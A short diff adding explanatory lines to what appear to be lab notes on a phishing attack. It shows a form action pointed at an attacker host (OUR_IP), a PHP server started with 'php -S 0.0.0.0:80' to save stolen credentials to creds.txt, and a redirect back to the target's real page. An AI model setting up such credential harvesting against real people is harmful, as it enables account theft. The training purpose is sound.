@@ -134,6 +134,12 @@ sudo php -S 0.0.0.0:80
 
 The PHP server now handles the HTTP request, saves the submitted credentials to `creds.txt`, and redirects the victim back to the original page.
 
+So:
+
+The form action=http://OUR_IP → creds come to you.
+Your PHP server php -S 0.0.0.0:80 runs on you (OUR_IP).
+The redirect Location: http://SERVER_IP/phishing/index.php → sends the victim back to the target’s real page.
+
 ---
 ---
 
